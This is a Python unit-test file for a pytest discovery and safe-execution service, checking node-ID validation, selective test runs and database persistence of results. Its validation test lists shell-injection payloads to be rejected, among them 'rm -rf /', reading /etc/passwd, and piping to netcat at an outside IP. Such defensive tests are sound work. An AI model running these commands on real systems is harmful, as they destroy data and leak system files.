"""
Unit tests for Pytest Discovery, Safe Isolated Execution, and Timeout Protection.
"""

from pathlib import Path
from sqlalchemy.orm import Session

from conftest.tests.discovery import validate_test_node_id, PytestDiscovery
from conftest.tests.executor import SafeTestExecutor
from conftest.tests.runner_service import TestRunnerService
from conftest.db import crud
from datetime import datetime


def test_node_id_validation_security():
    """Verify node ID sanitizer accepts valid test paths and rejects command injection attempts."""
    # Valid pytest node IDs
    assert validate_test_node_id("tests/test_auth.py::test_login") is True
    assert validate_test_node_id("tests/sub/test_db.py::TestClass::test_method") is True
    assert validate_test_node_id("tests/test_params.py::test_calc[param1-2]") is True

    # Malicious injection payloads
    assert validate_test_node_id("tests/test_auth.py; rm -rf /") is False
    assert validate_test_node_id("tests/test_auth.py && cat /etc/passwd") is False
    assert validate_test_node_id("tests/test_auth.py | nc 1.2.3.4 80") is False
    assert validate_test_node_id("`whoami`") is False
    assert validate_test_node_id("") is False


def test_pytest_discovery_on_sample_suite():
    """Verify test discovery on tests/sample_suite."""
    sample_root = Path("./tests/sample_suite")
    discovery = PytestDiscovery(str(sample_root))
    tests = discovery.discover_via_pytest(test_dir="tests")

    assert len(tests) >= 5
    test_ids = [t["test_id"] for t in tests]
    assert any("test_password_hashing" in t for t in test_ids)
    assert any("test_db_set_and_get" in t for t in test_ids)


def test_safe_test_executor_selective_run():
    """Verify executing a single selected test case via SafeTestExecutor."""
    sample_root = Path(".")
    executor = SafeTestExecutor(str(sample_root))

    target = "tests/sample_suite/tests/test_auth.py::test_password_hashing"
    result = executor.run_tests(test_node_ids=[target], timeout=30)

    assert result.exit_code == 0
    assert result.total_count >= 1
    assert result.passed_count >= 1
    assert result.failed_count == 0
    assert result.total_duration > 0


def test_runner_service_end_to_end(db_session: Session):
    """Verify end-to-end test execution, DB test_run persistence, and outcome calculation."""
    repo = crud.create_repository(
        db=db_session,
        full_name="sample/test-runner-app",
        url="https://github.com/sample/test-app",
        local_path="./tests/sample_suite",
    )
    commit = crud.create_commit(
        db=db_session,
        repository_id=repo.id,
        sha="e" * 40,
        timestamp=datetime.utcnow(),
    )

    service = TestRunnerService(repo_root=".")
    selected = ["tests/sample_suite/tests/test_auth.py::test_password_hashing"]

    metrics = service.execute_and_evaluate(
        db=db_session,
        commit_id=commit.id,
        repository_id=repo.id,
        selected_node_ids=selected,
        timeout=30,
    )

    assert metrics["exit_code"] == 0
    assert metrics["selected_count"] >= 1
    assert metrics["actual_failures"] == 0
    assert metrics["outcome_id"] is not None

    # Check persisted runs in DB
    runs = crud.get_test_runs_for_commit(db_session, commit.id)
    assert len(runs) >= 1
    assert runs[0].status == "PASSED"
